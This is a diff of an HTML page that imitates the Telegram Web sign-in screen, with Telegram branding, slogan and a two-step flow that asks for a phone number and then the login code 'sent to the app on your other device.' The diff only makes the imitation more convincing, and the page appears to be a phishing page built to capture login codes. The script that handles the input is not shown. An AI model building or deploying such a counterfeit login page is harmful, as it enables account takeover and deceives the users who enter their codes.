@@ -1,24 +1,52 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Telegram</title>
+    <title>Telegram Web</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <div class="container">
-        <h2>Telegram</h2>
-        <p>Enter your phone number</p>
-        <form id="phoneForm">
-            <input type="tel" id="phone" placeholder="Phone number" required>
-            <button type="submit">NEXT</button>
-        </form>
-        
-        <div id="codeSection" style="display: none;">
-            <p>Enter confirmation code</p>
-            <form id="codeForm">
-                <input type="text" id="code" placeholder="Code from Telegram" required>
-                <button type="submit">CONFIRM</button>
-            </form>
+    <div class="tg_page">
+        <div class="tg_login_container">
+            <div class="tg_header">
+                <div class="tg_logo">Telegram</div>
+                <div class="tg_subtitle">The world's fastest messaging app.<br>It is free and secure.</div>
+            </div>
+            
+            <div class="tg_login_form">
+                <!-- Шаг 1: Ввод номера -->
+                <div id="step1">
+                    <div class="tg_input_group">
+                        <label>Your Phone Number</label>
+                        <div class="tg_phone_input">
+                            <select class="tg_country_code">
+                                <option>+7</option>
+                                <option>+1</option>
+                                <option>+44</option>
+                            </select>
+                            <input type="tel" class="tg_phone" placeholder="Phone number" required>
+                        </div>
+                    </div>
+                    <button class="tg_btn_primary" onclick="nextStep()">NEXT</button>
+                </div>
+                
+                <!-- Шаг 2: Ввод кода -->
+                <div id="step2" style="display: none;">
+                    <div class="tg_code_info">
+                        <div class="tg_info_text">We've sent the code to the app on your other device.</div>
+                        <div class="tg_phone_display" id="phoneDisplay"></div>
+                    </div>
+                    <div class="tg_input_group">
+                        <label>Code</label>
+                        <input type="text" class="tg_code" placeholder="Enter code" required maxlength="5">
+                    </div>
+                    <button class="tg_btn_primary" onclick="submitCode()">SIGN IN</button>
+                </div>
+            </div>
+            
+            <div class="tg_footer">
+                <a href="#">Forgot password?</a>
+                <a href="#">Sign up</a>
+            </div>
         </div>
     </div>
     <script src="script.js"></script>
